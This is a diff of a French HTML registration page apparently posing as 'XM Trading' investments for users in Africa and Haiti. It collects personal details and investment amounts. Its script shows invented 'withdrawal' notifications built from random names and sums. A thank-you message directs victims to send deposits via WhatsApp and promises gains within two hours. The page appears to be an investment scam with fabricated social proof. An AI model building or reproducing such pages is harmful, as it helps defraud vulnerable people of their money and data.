@@ -3,14 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <title>Inscription XM Trading</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    * {box-sizing: border-box; margin: 0; padding: 0;}
+    * { margin:0; padding:0; box-sizing: border-box; }
     body {
       font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      background: linear-gradient(135deg, #f0f0f0, #d0d0d0);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -18,23 +16,45 @@
     header, footer {
       background: #000;
       color: #fff;
+      padding: 1rem;
       text-align: center;
-      padding: 10px;
-      font-weight: bold;
     }
-    .container {
+    .notifications {
+      position: relative;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 10px;
+    }
+    .notif {
+      background: rgba(0,0,0,0.6);
+      color: #fff;
+      padding: 8px 16px;
+      border-radius: 20px;
+      margin: 4px 0;
+      font-size: 0.9rem;
+      animation: slide 5s linear infinite;
+    }
+    @keyframes slide {
+      0% {opacity: 0; transform: translateY(-10px);}
+      10% {opacity: 1;}
+      90% {opacity: 1;}
+      100% {opacity: 0; transform: translateY(10px);}
+    }
+    main {
       flex: 1;
       display: flex;
       justify-content: center;
-      align-items: center;
-      padding: 20px;
+      align-items: flex-start;
+      padding: 1rem;
     }
     .card {
       background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      border-radius: 12px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
       width: 100%;
-      max-width: 500px;
+      max-width: 480px;
       padding: 20px;
       position: relative;
     }
@@ -54,213 +74,149 @@
       margin-top: 5px;
       border: 1px solid #ccc;
       border-radius: 5px;
-      font-size: 1rem;
     }
     .phone-group {
       display: flex;
       gap: 5px;
     }
-    .dial-code {
-      flex: 0 0 70px;
-      background: #f0f0f0;
-      text-align: center;
-    }
+    .dial-code { flex: 0 0 60px; text-align: center; background: #eee; }
+    .phone-group input[type="tel"] { flex: 1; }
     button {
       background: #1e3c72;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
+      color: #fff;
       margin-top: 15px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
     }
-    button:hover {
-      background: #16325c;
-    }
+    button:hover { background: #16325c; }
+
     #thankyou {
       display: none;
-      text-align: left;
-      font-family: 'Archivo Black', sans-serif;
       padding: 20px;
-      font-size: 1rem;
+      font-family: 'Archivo Black', sans-serif;
+      color: #1e3c72;
+      text-align: left;
     }
     #thankyou p {
-      margin: 10px 0;
+      margin-top: 10px;
+      line-height: 1.6;
+      color: #444;
     }
-    .notifications {
-      position: fixed;
-      top: 70px;
+    img.header-img {
       width: 100%;
-      display: flex;
-      justify-content: center;
-      z-index: 999;
-    }
-    .notification {
-      background: rgba(0,0,0,0.6);
-      color: #fff;
-      padding: 10px 20px;
-      margin: 5px;
-      border-radius: 5px;
-      animation: slide 15s linear infinite;
-    }
-    @keyframes slide {
-      0% {transform: translateX(100%);}
-      100% {transform: translateX(-100%);}
+      border-bottom: 4px solid #000;
     }
   </style>
 </head>
 <body>
+  <header>
+    <h1>XM Trading Investissement</h1>
+  </header>
 
-<header>XM Trading Investissement</header>
+  <img src="entete.jpg" alt="Entête" class="header-img">
 
-<div class="notifications" id="notifications"></div>
+  <div class="notifications" id="notifications"></div>
 
-<div class="container">
-  <div class="card">
-    <h2 id="form-title">Inscription XM Trading</h2>
-    <form id="registration-form" name="inscription-xm" method="POST" data-netlify="true" action="/?success=true" netlify-honeypot="bot-field">
-      <input type="hidden" name="form-name" value="inscription-xm">
-      <p style="display:none;"><label>Ne pas remplir <input name="bot-field"></label></p>
+  <main>
+    <div class="card">
+      <h2 id="form-title">Inscription XM Trading</h2>
+      <form name="inscription-xm" method="POST" data-netlify="true" netlify-honeypot="bot-field">
+        <input type="hidden" name="form-name" value="inscription-xm">
+        <p style="display:none;"><label>Ne pas remplir <input name="bot-field"></label></p>
 
-      <label for="nom">Nom</label>
-      <input type="text" id="nom" name="nom" required>
+        <label>Nom</label>
+        <input type="text" name="nom" required>
+        <label>Prénom</label>
+        <input type="text" name="prenom" required>
 
-      <label for="prenom">Prénom</label>
-      <input type="text" id="prenom" name="prenom" required>
+        <label>Pays</label>
+        <select id="pays" name="pays" required>
+          <option value="" disabled selected>Choisissez votre pays</option>
+          <optgroup label="Afrique Ouest">
+            <option value="Côte d'Ivoire">Côte d'Ivoire</option><option value="Sénégal">Sénégal</option><option value="Togo">Togo</option>
+            <!-- Autres pays -->
+          </optgroup>
+          <optgroup label="Afrique Centrale">
+            <option value="Cameroun">Cameroun</option><option value="RDC">RDC</option>
+          </optgroup>
+          <optgroup label="Autres">
+            <option value="Haïti">Haïti</option><option value="Madagascar">Madagascar</option>
+          </optgroup>
+        </select>
 
-      <label for="pays">Pays</label>
-      <select id="pays" name="pays" required>
-        <option value="" disabled selected>Choisissez votre pays</option>
-        <optgroup label="Afrique de l'Ouest">
-          <option value="Côte d'Ivoire">Côte d'Ivoire</option>
-          <option value="Sénégal">Sénégal</option>
-          <option value="Mali">Mali</option>
-          <option value="Bénin">Bénin</option>
-          <option value="Burkina Faso">Burkina Faso</option>
-          <option value="Guinée">Guinée</option>
-          <option value="Togo">Togo</option>
-        </optgroup>
-        <optgroup label="Afrique centrale">
-          <option value="Cameroun">Cameroun</option>
-          <option value="RDC">RDC</option>
-          <option value="Gabon">Gabon</option>
-        </optgroup>
-        <optgroup label="Autres">
-          <option value="Haïti">Haïti</option>
-          <option value="Madagascar">Madagascar</option>
-        </optgroup>
-      </select>
+        <label>Téléphone</label>
+        <div class="phone-group">
+          <input type="text" id="dial-code" readonly>
+          <input type="tel" id="phone" name="phone" required>
+        </div>
 
-      <label>Téléphone</label>
-      <div class="phone-group">
-        <input type="text" id="dial-code" readonly class="dial-code" placeholder="+xxx">
-        <input type="tel" id="phone" name="phone" required>
+        <label>Montant à investir</label>
+        <input type="number" name="montant" required>
+
+        <label>Devise</label>
+        <select name="devise" required>
+          <option value="USD">$ Dollar</option><option value="XOF">FCFA</option><option value="EUR">Euro</option>
+        </select>
+
+        <label>Âge</label>
+        <input type="number" name="age" required>
+        <label>Métier</label>
+        <input type="text" name="metier" required>
+
+        <label>Sexe</label>
+        <select name="sexe" required>
+          <option value="Homme">Homme</option><option value="Femme">Femme</option>
+        </select>
+
+        <button type="submit">Valider l’inscription</button>
+      </form>
+
+      <div id="thankyou">
+        <h2>🎉 Félicitations, <span id="sexe"></span> <span id="nom"></span> !</h2>
+        <p>Vous avez été enregistré avec succès chez XM Trading pour un investissement de <span id="montant"></span> <span id="devise"></span>.</p>
+        <p>Contactez votre administrateur sur WhatsApp pour effectuer votre dépôt d’investissement.</p>
+        <p>Après le dépôt, vous allez simplement patienter 2 heures maximum pour le traitement de votre investissement et recevoir votre gain directement sur votre compte.</p>
+        <p><strong>Merci de votre confiance.</strong></p>
       </div>
-
-      <label for="montant">Montant à investir</label>
-      <input type="number" id="montant" name="montant" required>
-
-      <label for="devise">Devise</label>
-      <select id="devise" name="devise" required>
-        <option value="" disabled selected>Choisissez</option>
-        <option value="USD">$ Dollar</option>
-        <option value="XOF">FCFA</option>
-        <option value="XAF">Franc Congo</option>
-        <option value="HTG">Gourde</option>
-        <option value="MGA">Ariary</option>
-        <option value="EUR">€ Euro</option>
-      </select>
-
-      <label for="age">Âge</label>
-      <input type="number" id="age" name="age" min="18" required>
-
-      <label for="metier">Métier</label>
-      <input type="text" id="metier" name="metier" required>
-
-      <label for="sexe">Sexe</label>
-      <select id="sexe" name="sexe" required>
-        <option value="" disabled selected>Choisissez</option>
-        <option value="Monsieur">Monsieur</option>
-        <option value="Madame">Madame</option>
-      </select>
-
-      <button type="submit">Valider l’inscription</button>
-    </form>
-
-    <div id="thankyou">
-      <h2>🎉 Félicitations, <span id="thx-sexe"></span> <span id="thx-nom"></span> !</h2>
-      <p>Vous avez été enregistré avec succès pour un investissement de <strong><span id="thx-montant"></span> <span id="thx-devise"></span></strong>.</p>
-      <p>Contactez votre administrateur sur WhatsApp pour effectuer votre dépôt pour le lancement de votre investissement.</p>
-      <p>Après le dépôt, vous allez juste attendre 2 heures pour recevoir votre gain directement sur votre compte.</p>
-      <p>Merci de votre confiance.</p>
     </div>
-  </div>
-</div>
+  </main>
 
-<footer>&copy; 2025 XM Trading Investissement</footer>
+  <footer>
+    <p>&copy; 2025 XM Trading. Tous droits réservés.</p>
+  </footer>
 
-<script>
-const codes = {
-  "Côte d'Ivoire":{code:"+225",length:8}, "Sénégal":{code:"+221",length:9},
-  "Mali":{code:"+223",length:8}, "Bénin":{code:"+229",length:8},
-  "Burkina Faso":{code:"+226",length:8}, "Guinée":{code:"+224",length:8},
-  "Togo":{code:"+228",length:8}, "Cameroun":{code:"+237",length:9},
-  "RDC":{code:"+243",length:9}, "Gabon":{code:"+241",length:8},
-  "Haïti":{code:"+509",length:8}, "Madagascar":{code:"+261",length:9}
-};
+  <script>
+    const codes = {"Côte d'Ivoire":"+225","Sénégal":"+221","Togo":"+228","Cameroun":"+237","RDC":"+243","Haïti":"+509","Madagascar":"+261"};
+    const phoneLength = {"Côte d'Ivoire":8,"Sénégal":9,"Togo":8,"Cameroun":9,"RDC":9,"Haïti":8,"Madagascar":9};
+    const paysEl = document.getElementById('pays');
+    const dialEl = document.getElementById('dial-code');
+    const phoneEl = document.getElementById('phone');
 
-const noms = ["Abdoulaye","Faty","Emmanuel","Jean-Pierre","Moussa","Clarisse","Rosine","Nadine","Serge","Pascaline","Koffi","Blaise","Saliou","Ali","Mireille","Oscar","Diarra","Yao","Victor","Gaëlle"];
-const devises = ["USD","XOF","XAF","HTG","MGA","EUR"];
+    paysEl.addEventListener('change', () => {
+      let country = paysEl.value;
+      dialEl.value = codes[country] || '';
+      phoneEl.maxLength = phoneLength[country] || 9;
+    });
 
-function randomMontant(devise){
-  if(devise=="USD"||devise=="EUR") return Math.floor(Math.random()*9700)+300;
-  else return Math.floor(Math.random()*4700000)+300000;
-}
-
-function generateNotification(){
-  let nom = noms[Math.floor(Math.random()*noms.length)];
-  let devise = devises[Math.floor(Math.random()*devises.length)];
-  let montant = randomMontant(devise);
-  return `🎉 ${nom} vient de retirer ${montant} ${devise}`;
-}
-
-setInterval(()=>{
-  let div = document.createElement("div");
-  div.className = "notification";
-  div.textContent = generateNotification();
-  document.getElementById("notifications").appendChild(div);
-  setTimeout(()=>div.remove(), 15000);
-}, 3000);
-
-document.getElementById('pays').addEventListener('change',function(){
-  let data = codes[this.value];
-  document.getElementById('dial-code').value = data ? data.code : '';
-});
-
-document.getElementById('registration-form').addEventListener('submit',function(e){
-  let pays = document.getElementById('pays').value;
-  let phone = document.getElementById('phone').value;
-  if(codes[pays] && phone.length != codes[pays].length){
-    alert(`Le numéro doit contenir ${codes[pays].length} chiffres pour ${pays}`);
-    e.preventDefault();
-  }
-});
-
-const params = new URLSearchParams(window.location.search);
-if(params.get('success')==='true'){
-  document.getElementById('registration-form').style.display='none';
-  document.getElementById('form-title').style.display='none';
-  document.getElementById('thankyou').style.display='block';
-  document.getElementById('thx-sexe').innerText = localStorage.getItem('sexe')||'';
-  document.getElementById('thx-nom').innerText = localStorage.getItem('nom')||'';
-  document.getElementById('thx-montant').innerText = localStorage.getItem('montant')||'';
-  document.getElementById('thx-devise').innerText = localStorage.getItem('devise')||'';
-}
-
-document.getElementById('registration-form').addEventListener('change',function(){
-  localStorage.setItem('nom',document.getElementById('nom').value);
-  localStorage.setItem('sexe',document.getElementById('sexe').value);
-  localStorage.setItem('montant',document.getElementById('montant').value);
-  localStorage.setItem('devise',document.getElementById('devise').value);
-});
-</script>
+    // Notifications aléatoires
+    const names = ["Aliou", "Brice", "Fatou", "Moussa", "Zara", "Franck", "Chantal", "Diarra", "Gaston", "Nadine", "Yao", "Modibo"];
+    const devises = ["USD", "XOF", "EUR"];
+    function getRandomAmount(devise){
+      let amount = 300 + Math.floor(Math.random() * 9700);
+      if(devise === "XOF") return (amount * 1000) + " FCFA";
+      if(devise === "EUR") return amount + " €";
+      return amount + " $";
+    }
+    function showNotif() {
+      let notif = document.createElement('div');
+      notif.className = 'notif';
+      let devise = devises[Math.floor(Math.random() * devises.length)];
+      notif.textContent = "🎉 " + names[Math.floor(Math.random() * names.length)] + " vient de retirer " + getRandomAmount(devise);
+      document.getElementById('notifications').appendChild(notif);
+      setTimeout(() => notif.remove(), 5000);
+    }
+    setInterval(showNotif, 4000);
+  </script>
 </body>
 </html>
